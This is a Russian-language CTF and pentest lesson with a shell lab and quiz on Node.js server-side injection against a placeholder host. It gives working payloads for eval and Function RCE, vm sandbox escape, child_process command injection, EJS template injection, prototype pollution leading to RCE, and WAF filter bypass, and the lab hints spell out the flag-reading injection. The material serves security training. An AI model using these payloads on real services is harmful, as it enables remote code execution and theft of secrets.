---
id: web-nodejs-injection
title: "Серверные инъекции в Node.js: eval, vm, child_process"
category: web
parent: web-command-injection
difficulty: hard
order: 2
tags: [nodejs, eval, vm, child_process, injection, rce]
prerequisites: [web-command-injection]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 40
summary: "Node.js-специфичные sinks: eval, Function, vm/vm2 sandbox escape, child_process, template literals, prototype pollution → RCE."
lab:
  kind: shell
  title: "Практика: серверные инъекции в Node.js"
  toolset: [core, curl]
  workdir: /home/student/task
  files: [task.md]
  check: "grep -q 'nto{' found.txt"
  hints:
    - У сервиса три эндпоинта: `/calc?expr=`, `/run?code=`, `/ping?host=`.
    - `/ping` собирает shell-команду — попробуй разделитель: `curl -s 'https://tools.example/ping?host=127.0.0.1;id'`.
    - `;` запускает вторую команду от имени процесса Node (www-data).
    - Прочитай флаг: `curl -s 'https://tools.example/ping?host=127.0.0.1;cat flag.txt' | grep 'nto{' > found.txt`, затем `check`.
---

## Вопрос, с которого всё начинается

JavaScript мы привыкли считать «безопасным»: в браузере код ограничен страницей и не может выйти за её пределы. Но в **Node.js** тот же JavaScript исполняется **на сервере**, с доступом к файлам, сети и дочерним процессам.

Вопрос: что произойдёт, если приложение возьмёт твой ввод и передаст его в `eval` или в системную команду? Тогда ты получишь RCE — и сегодня разберём это на одном примере, где есть «калькулятор» и «пинг».

## Наш пример

Есть Node-сервис `tools.example` с двумя эндпоинтами. Первый — калькулятор, который считает выражение из параметра:

```bash
$ curl -s 'https://tools.example/calc?expr=1%2B1'
2
```

Сервер посчитал `1+1` и вернул `2`. Как он это сделал? Скорее всего, через `eval` или `new Function` — то есть **исполнил** нашу строку как код. Проверим, есть ли у нас доступ к процессу:

```bash
$ curl -s 'https://tools.example/calc?expr=process.version'
v20.11.0
$ curl -s 'https://tools.example/calc?expr=process.env.SECRET_KEY'
supersecret123
```

Мы прочитали переменные окружения — включая секреты. Это уже компромисс. Теперь добьём до выполнения команды:

```bash
$ curl -s 'https://tools.example/calc?expr=require("child_process").execSync("id").toString()'
uid=0(root) gid=0(root) groups=0(root)
```

`uid=0(root)` — команда выполнена на сервере. Артефакт получен.

## Шаг 1: почему `eval` в Node опасен

В браузере `eval` ограничен песочницей страницы. На сервере тот же `eval` исполняет код **с правами процесса** — он видит файловую систему, сеть, переменные окружения и может запускать дочерние процессы. Кроме того, экосистема Node поощряет динамическое исполнение: шаблонизаторы, конфиги на JS, плагины.

Уязвимые sink'и выглядят так:

```js
app.get('/calc', (req, res) => res.send(eval(req.query.expr)));      // уязвимо
const fn = new Function('return ' + req.query.expr);                 // уязвимо
setTimeout(req.query.code, 100);                                     // уязвимо
```

Все три принимают строку и исполняют её. Проверка — арифметикой и доступом к процессу (`process.version`), как в нашем примере.

## Шаг 2: `vm` — это НЕ песочница

Иногда приложение честно пытается «изолировать» чужой код модулем `vm`:

```js
const vm = require('vm');
vm.runInNewContext(req.query.code, {});   // выглядит как песочница
```

Но модуль `vm` документирован как **не граница безопасности**. Из него есть известные побеги через конструктор функции:

```bash
$ curl -s 'https://tools.example/run?code=this.constructor.constructor("return process")().env'
{ ... переменные окружения, включая секреты ... }
$ curl -s 'https://tools.example/run?code=this.constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()'
uid=0(root)
```

Идея побега: `this.constructor` даёт функцию, `constructor.constructor` — глобальный конструктор `Function`, а он уже создаёт код в **основном** контексте, вне песочницы. Библиотека `vm2` добавляла реальную изоляцию, но и её неоднократно обходили (CVE-2023-29017 и др.). Если видишь `vm2` старой версии — проверь известные побеги.

## Шаг 3: `child_process` — команда из ввода

Второй эндпоинт — пинг:

```bash
$ curl -s 'https://tools.example/ping?host=127.0.0.1'
PING 127.0.0.1: 1 packets transmitted, 1 received
```

Он почти наверняка делает что-то вроде `exec(\`ping -c1 ${host}\`)`. Функция `exec` запускает **shell**, поэтому разделители команд работают:

```bash
$ curl -s 'https://tools.example/ping?host=127.0.0.1;id'
PING ... uid=33(www-data) gid=33(www-data)
$ curl -s 'https://tools.example/ping?host=$(id)'
$ curl -s 'https://tools.example/ping?host=127.0.0.1%0aid'
```

`;` запускает вторую команду, `$(...)` и бэктики делают подстановку, `%0a` (перевод строки) разрывает строку. Важно различать: `exec` запускает shell (разделители работают), а `spawn` с массивом аргументов и **без** `shell:true` — безопаснее. Смотри, какой вызов используется.

## Шаг 4: шаблонизаторы

Node-шаблонизаторы (`ejs`, `pug`, `handlebars`) при компиляции шаблона из пользовательского ввода дают SSTI:

```bash
$ curl -s 'https://tools.example/render?tpl=<%=7*7%>'
49
$ curl -s 'https://tools.example/render?tpl=<%=process.mainModule.require("child_process").execSync("id")%>'
uid=33(www-data)
```

`<%= ... %>` в EJS вычисляет выражение. Handlebars использует более сложную цепочку через `constructor`, но принцип тот же. Если сервер отдаёт `render` с шаблоном от пользователя — это RCE.

## Шаг 5: прототип-загрязнение → RCE

Есть и непрямой путь. Если приложение рекурсивно сливает твой JSON в объект и не защищено от ключа `__proto__`, ты загрязняешь `Object.prototype`. Само загрязнение код не выполняет, но меняет поведение встроенных модулей:

```bash
# 1. подтверждаем загрязнение
$ curl -s https://tools.example/api/settings -X POST -H 'Content-Type: application/json' \
    -d '{"__proto__":{"pp_test":"yes"}}'
$ curl -s https://tools.example/api/settings | grep pp_test
"pp_test":"yes"        # прототип загрязнён

# 2. загрязняем опции child_process
$ curl -s https://tools.example/api/settings -X POST -H 'Content-Type: application/json' -d '{
    "__proto__":{"shell":"/proc/self/exe","argv":["node","-e","require(\"child_process\").execSync(\"id\").toString()"]}}'

# 3. провоцируем любой вызов child_process без явных опций
$ curl -s https://tools.example/api/export
uid=0(root) gid=0(root)     # RCE через загрязнённый прототип
```

Ключевое: нужен «триггер» — участок, который вызывает `child_process` и полагается на свойства из прототипа (экспорт данных, конвертация, вызов внешней утилиты). Именно комбинация загрязнения и триггера даёт RCE.

## Шаг 6: обход фильтров

Если WAF блокирует `child_process`, `require` или `eval`, строки собирают по частям:

```bash
$ curl -s "https://tools.example/calc?expr=require(String.fromCharCode(99,104,105,108,100,95,112,114,111,99,101,115,115))"
$ curl -s "https://tools.example/run?code=process.mainModule.require('child_process').execSync('id')"
$ curl -s "https://tools.example/run?code=[].constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"
```

`String.fromCharCode(...)` собирает строку из кодов символов, `process.mainModule.require` и `module.constructor._load` дают доступ к модулям в обход фильтра по слову `require`.

## Шаг 7: где искать sink при аудите

Если есть доступ к исходникам (утечка `.git`, `npm pack`, отладочные страницы), поиск точек входа занимает минуты:

```bash
$ grep -rnE 'eval\(|new Function|child_process|vm\.run|require\(.*req\.' src/
```

Смотри на всё, где пользовательский ввод склеивается со строкой и уходит в исполнение: калькуляторы, конвертеры, «шаблоны отчётов», экспорт данных, вызовы внешних утилит (`ffmpeg`, `imagemagick`, `wkhtmltopdf`). Отдельно проверь `package.json` на `vm2`, `ejs`, `pug`, `node-serialize` и их версии — старые сборки уязвимы. Если исходников нет, ориентируйся по поведению: подай `1+1` (признак `eval`), `process.version` (доступ к процессу), `{{7*7}}` (шаблонизатор) и `127.0.0.1;id` (command injection). Так ты найдёшь sink даже вслепую.

## Что мы теперь знаем

- В Node `eval`/`new Function` исполняют код **с правами процесса** — это RCE.
- `vm` — **не** песочница; побег через `constructor.constructor`.
- `child_process.exec` запускает shell → command injection через `;`, `|`, `$()`, `%0a`.
- Шаблонизаторы (`ejs`, `pug`, `handlebars`) с шаблоном от пользователя — SSTI.
- Прототип-загрязнение + триггер даёт RCE через опции `child_process`.
- Фильтры обходят сборкой строк (`String.fromCharCode`) и `process.mainModule.require`.
- Артефакт — вывод `id` или интерактивный шелл.

## На что смотреть дальше

- **`vm` не защищает** — если видишь «playground»/«sandbox»-эндпоинт, исходи из того, что он даёт RCE.
- **Различай `exec` и `spawn`** — первый запускает shell, второй с массивом аргументов безопаснее.
- **`require` недоступен?** — используй `process.mainModule.require` или `module.constructor._load`.
- **Не пропусти prototype pollution** — это частый путь, когда прямого `eval` нет.
- **Проверь версии** `vm2`/`ejs`/`pug` — старые сборки уязвимы.
- **Только с согласия.** RCE меняет состояние прода.

## Квиз

Проверь себя.

```quiz
- question: "Почему `vm` в Node.js не является песочницей?"
  options:
    - "Он медленный"
    - "Он документирован как небезопасный; из него есть побег через constructor"
    - "Он шифрует код"
    - "Он не поддерживает JS"
  answer: 1
  explanation: "`vm` — не граница безопасности; `constructor.constructor` выходит наружу."
- question: "Какой payload выполняет команду, если прямой `require` недоступен?"
  options:
    - "`eval('id')`"
    - "`this.constructor.constructor('return process')().mainModule.require('child_process').execSync('id')`"
    - "`process.exit()`"
    - "`console.log('id')`"
  answer: 1
  explanation: "Доступ к require через глобальный конструктор Function."
- question: "Чем опасен `child_process.exec` с пользовательским вводом?"
  options:
    - "Он медленный"
    - "Команда интерполируется в shell → command injection"
    - "Он шифрует вывод"
    - "Он кеширует результат"
  answer: 1
  explanation: "`exec` запускает shell, поэтому разделители `;`/`|`/`$()` работают."
- question: "Как prototype pollution может дать RCE?"
  options:
    - "Никак"
    - "Загрязнение `Object.prototype` меняет опции `child_process`/шаблонизатора, нужен триггер"
    - "Меняет TLS-сертификат"
    - "Сбрасывает кеш"
  answer: 1
  explanation: "Цепочка: загрязнение свойств + любой вызов, читающий их из прототипа."
- question: "Какая библиотека-«песочница» исторически обходилась CVE-2023-*?"
  options:
    - "lodash"
    - "vm2"
    - "express"
    - "axios"
  answer: 1
  explanation: "`vm2` неоднократно обходился, несмотря на заявленную изоляцию."
```

## Куда дальше

Дальше мы вернёмся к самому популярному классу веб-уязвимостей — **XSS** — и разберём, как он устроен на клиенте (`web-xss`). А пока главное запомни: в Node.js **любой ввод, попавший в `eval`, шаблон или команду**, — это путь к RCE, потому что песочницы здесь нет.

## Где пригодится

- **CTF (Web):** задачи на Node-калькуляторы/vm.
- **Bug bounty:** RCE в Node-сервисах.
- **Пентест:** аудит Node.js-приложений.
- **Работа (AppSec):** запрет eval/vm, обновление vm2, параметризация child_process.
